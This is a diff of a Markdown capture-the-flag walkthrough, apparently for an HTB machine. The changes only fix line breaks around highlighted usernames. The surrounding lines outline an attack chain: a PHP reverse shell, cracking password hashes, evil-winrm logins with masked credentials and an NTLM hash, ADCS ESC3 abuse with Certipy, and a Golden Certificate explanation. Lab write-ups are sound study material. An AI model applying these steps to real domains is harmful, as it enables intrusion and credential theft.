@@ -352,8 +352,7 @@ Let's have a reverse shell now  🔻
 
 I used this [revshell.com](https://www.revshells.com/) >>> <kbd>PHP Ivan Sincek </kbd> payload and changed the IP and port for receiving the reverseshell.
 
-## 5️⃣ User Shell as <b><span style="color:rgb(219, 0, 0)">xamppuser</span></b>
-
+## 5️⃣ User Shell as <b><span style="color:rgb(219, 0, 0)">xamppuser</span></b> 
 
 After getting shell I got the `db.php` file and some creds 🔻
 
@@ -401,8 +400,7 @@ id	first_name	last_name	username	email	password	created_at	role	is_active
 ```
 {: .nolineno }
 
-Extracted password hashes and cracked them with `hashcat` and I got the result as <b><span style="color:rgb(219, 0, 0)">sara.b</span></b>
- has a password.
+Extracted password hashes and cracked them with `hashcat` and I got the result as <b><span style="color:rgb(219, 0, 0)">sara.b</span></b>  has a password.
 
 ## 7️⃣ Password Cracking and Sara.B Access
 
@@ -418,8 +416,7 @@ $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:B*****2
 ```
 {: .nolineno }
 
-I got the wimrm session for <b><span style="color:rgb(219, 0, 0)">Sara.b</span></b>
- user 🔻
+I got the wimrm session for <b><span style="color:rgb(219, 0, 0)">Sara.b</span></b>  user 🔻
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Sara.B> tree /f /a
@@ -475,15 +472,13 @@ $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a437
 ```
 {: .nolineno }
 
-## 9️⃣ User Shell as <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>
-
+## 9️⃣ User Shell as <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b> 
 
 **Tools**: Evil-WinRM for access; BloodHound for AD analysis.
 
 **Content**:
 
-I got the password for user <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>
- 🔻
+I got the password for user <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>  🔻
 
 ```powershell
 └─$ evil-winrm -i 10.10.11.71 -u 'Lion.SK' -p '!*******x'                                          
@@ -509,13 +504,11 @@ C:.
 ```
 {: .nolineno }
 
-I observed the domain through bloodhound and I got this user <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>
- as a part of <mark style="background: #BBFABBA6;">Domain CRA Managers</mark> group in which The members of this security group are responsible for issuing and revoking multiple
+I observed the domain through bloodhound and I got this user <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>  as a part of <mark style="background: #BBFABBA6;">Domain CRA Managers</mark> group in which The members of this security group are responsible for issuing and revoking multiple
 certificates for the domain users.
 
 ![](Pasted%20image%2020250914120833.png)
-_Bloodhound <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>
- user Outbound object control relations_
+_Bloodhound <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>  user Outbound object control relations_
 
 ## 🔟 ADCS Enumeration and ESC3 Exploitation
 
@@ -645,8 +638,7 @@ d-----       12/29/2024   5:30 PM                xamppuser
 
 Let's exploit **ESC-3** from here [PATH](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template) 🔻
 
-I tried to impersonate as all 3 user's and within these three users. I got success from <b><span style="color:rgb(219, 0, 0)">ryan.k</span></b>
- user.
+I tried to impersonate as all 3 user's and within these three users. I got success from <b><span style="color:rgb(219, 0, 0)">ryan.k</span></b>  user.
 
 **Step 1: Obtain an Enrollment Agent certificate.**
 
@@ -716,8 +708,7 @@ File 'ryan.k.ccache' already exists. Overwrite? (y/n - saying no will save with 
 
 **Content**:
 
-Lets have a winrm session of <b><span style="color:rgb(219, 0, 0)">ryan.k</span></b>
- user 🔻
+Lets have a winrm session of <b><span style="color:rgb(219, 0, 0)">ryan.k</span></b>  user 🔻
 
 ```powershell
 └─$ evil-winrm -i 10.10.11.71 -u 'ryan.k' -H b1bc3d70e70f4f36b15....5ae1a2ae6
@@ -901,8 +892,7 @@ Imagine the CA is a **government printing press** that makes official ID cards. 
 - **Stealth**: Certificate authentication looks like normal activity
 - **Bypasses other security**: Works even if you change administrator passwords
 
-This is different from other certificate attacks because you didn't just steal one user's certificate - you stole the CA's ability to create ANY certificate. That's why it's called "<b><span style="color:rgb(0, 83, 250)">Golden</span></b>
-" - it's the master key to the entire domain's certificate system.
+This is different from other certificate attacks because you didn't just steal one user's certificate - you stole the CA's ability to create ANY certificate. That's why it's called "<b><span style="color:rgb(0, 83, 250)">Golden</span></b> " - it's the master key to the entire domain's certificate system.
 
 ## ⑫  Administrator Access
 
